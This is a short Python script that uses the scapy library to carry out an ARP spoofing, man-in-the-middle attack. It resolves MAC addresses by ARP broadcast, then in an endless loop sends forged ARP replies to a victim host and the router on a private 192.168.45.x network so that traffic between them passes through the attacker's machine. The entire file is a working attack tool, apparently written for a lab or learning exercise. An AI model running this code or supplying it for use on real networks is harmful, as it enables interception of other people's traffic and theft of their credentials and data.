#!/usr/bin/env python

import scapy.all as scapy
import time

ATTACKED_HOST_IP = '192.168.45.131'
# ATTACKED_HOST_MAC = '00:0C:29:2F:7F:BE'
ROUTER_IP = '192.168.45.2'
#print(packet.show())
#print(packet.summary())
def get_mac_addr(ip):
    ''' Get mac address by ip '''
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    resp_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return resp_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac_addr = get_mac_addr(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_addr,
        psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof(ATTACKED_HOST_IP,ROUTER_IP)
    spoof(ROUTER_IP,ATTACKED_HOST_IP)
    time.sleep(2)